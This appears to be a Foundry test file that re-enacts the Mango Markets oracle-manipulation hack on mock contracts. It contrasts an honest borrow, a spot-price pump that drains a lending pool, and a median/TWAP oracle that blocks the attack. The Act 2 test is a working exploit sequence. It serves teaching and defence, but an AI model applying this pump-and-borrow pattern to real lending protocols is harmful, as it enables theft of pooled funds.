// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockToken} from "../src/MockToken.sol";
import {MiniDEX} from "../src/MiniDEX.sol";
import {SpotOracle, MedianOracle, IOracle} from "../src/Oracles.sol";
import {LendingPool} from "../src/LendingPool.sol";

/// The Mango Markets oracle-manipulation hack ($114M, Oct 2022), rebuilt in three acts.
///   Act 1 — HONEST : a normal borrow within the collateral limit works.
///   Act 2 — ATTACK : pump the collateral token's spot price → inflated collateral →
///                    borrow far more than you deposited → drain the treasury.
///   Act 3 — FIX    : a median/TWAP oracle ignores the single-block pump, so the
///                    identical over-borrow reverts. Honest borrowing still works.
contract MangoTest is Test {
    MockToken mngo;
    MockToken usdc;
    address alice = makeAddr("alice"); // honest borrower
    address eve   = makeAddr("eve");   // the attacker

    uint256 constant E18 = 1e18;
    uint256 constant POOL_USDC = 100_000e18; // lending liquidity

    function setUp() public {
        mngo = new MockToken("Mango", "MNGO");
        usdc = new MockToken("USD Coin", "USDC");
    }

    // a fresh DEX seeded 1,000 MNGO / 1,000 USDC  => honest spot price = 1 USDC/MNGO
    function _newDex() internal returns (MiniDEX dex) {
        dex = new MiniDEX(mngo, usdc);
        mngo.mint(address(dex), 1_000e18);
        usdc.mint(address(dex), 1_000e18);
        dex.sync();
    }

    function _fund(LendingPool pool) internal { usdc.mint(address(pool), POOL_USDC); }
    function _usd(uint256 w) internal pure returns (uint256) { return w / 1e18; }

    // -------------------------------------------------------------------------
    function test_Act1_HonestBorrow() public {
        MiniDEX dex = _newDex();
        LendingPool pool = new LendingPool(mngo, usdc, new SpotOracle(dex));
        _fund(pool);

        // alice posts 1,000 MNGO (worth 1,000 USDC) and borrows 800 (80% LTV).
        mngo.mint(alice, 1_000e18);
        vm.startPrank(alice);
        mngo.approve(address(pool), type(uint256).max);
        pool.deposit(1_000e18);
        pool.borrow(800e18);
        vm.stopPrank();

        console2.log("ACT 1 - HONEST borrow (spot price = 1 USDC/MNGO)");
        console2.log("  MNGO price used (USDC):   ", _usd(new SpotOracle(dex).price()));
        console2.log("  alice collateral value:   ", _usd(pool.collateralValue(alice)));
        console2.log("  alice borrowed (USDC):    ", _usd(usdc.balanceOf(alice)));
        assertEq(usdc.balanceOf(alice), 800e18);
    }

    // -------------------------------------------------------------------------
    function test_Act2_OracleManipulationDrain() public {
        MiniDEX dex = _newDex();
        SpotOracle oracle = new SpotOracle(dex);
        LendingPool pool = new LendingPool(mngo, usdc, oracle);
        _fund(pool);

        // Eve holds 1,000 MNGO to post + 9,000 USDC to pump the price with.
        mngo.mint(eve, 1_000e18);
        usdc.mint(eve, 9_000e18);

        vm.startPrank(eve);
        mngo.approve(address(pool), type(uint256).max);
        usdc.approve(address(dex), type(uint256).max);
        pool.deposit(1_000e18);

        console2.log("ACT 2 - ATTACK (manipulate the spot oracle)");
        console2.log("  price BEFORE pump (USDC):  ", _usd(oracle.price()));
        console2.log("  collateral value BEFORE:   ", _usd(pool.collateralValue(eve)));

        // Pump: dump 9,000 USDC into the thin pool -> MNGO spot rockets ~100x.
        dex.swapUsdcForMngo(9_000e18);
        console2.log("  price AFTER pump (USDC):   ", _usd(oracle.price()));
        console2.log("  collateral value AFTER:    ", _usd(pool.collateralValue(eve)));

        // Borrow against the fake, inflated collateral and drain the treasury.
        pool.borrow(80_000e18);
        vm.stopPrank();

        console2.log("  eve borrowed (USDC):       ", _usd(usdc.balanceOf(eve) )); // includes leftover pump change? no—spent
        console2.log("  pool remaining (USDC):     ", _usd(usdc.balanceOf(address(pool))));
        assertEq(usdc.balanceOf(address(pool)), POOL_USDC - 80_000e18); // 100k -> 20k
        assertGe(pool.debt(eve), 80_000e18);
    }

    // -------------------------------------------------------------------------
    function test_Act3_MedianOracleBlocksIt() public {
        MiniDEX dex = _newDex();
        MedianOracle oracle = new MedianOracle(dex);
        // Seed 5 honest observations at the true price, one per hour (TWAP-style).
        for (uint256 i; i < 5; i++) {
            oracle.poke();
            vm.warp(block.timestamp + 1 hours);
        }
        LendingPool pool = new LendingPool(mngo, usdc, oracle);
        _fund(pool);

        // Eve runs the exact same attack.
        mngo.mint(eve, 1_000e18);
        usdc.mint(eve, 9_000e18);
        vm.startPrank(eve);
        mngo.approve(address(pool), type(uint256).max);
        usdc.approve(address(dex), type(uint256).max);
        pool.deposit(1_000e18);
        dex.swapUsdcForMngo(9_000e18);              // spot is pumped ~100x...

        // ...but the median oracle still reports the honest price, so collateral
        // value is unchanged and the over-borrow reverts.
        console2.log("ACT 3 - FIX (median/TWAP oracle)");
        console2.log("  spot price now (USDC):     ", _usd(dex.spotPrice()));
        console2.log("  oracle price (median):     ", _usd(oracle.price()));
        console2.log("  collateral value (USDC):   ", _usd(pool.collateralValue(eve)));
        vm.expectRevert(bytes("undercollateralized"));
        pool.borrow(80_000e18);
        vm.stopPrank();

        // Honest borrowing still works on the fixed market.
        mngo.mint(alice, 1_000e18);
        vm.startPrank(alice);
        mngo.approve(address(pool), type(uint256).max);
        pool.deposit(1_000e18);
        pool.borrow(800e18);
        vm.stopPrank();
        console2.log("  honest alice borrowed (USDC):", _usd(usdc.balanceOf(alice)));

        assertEq(usdc.balanceOf(eve), 0);          // eve borrowed nothing
        assertEq(usdc.balanceOf(alice), 800e18);
        assertEq(usdc.balanceOf(address(pool)), POOL_USDC - 800e18);
    }
}
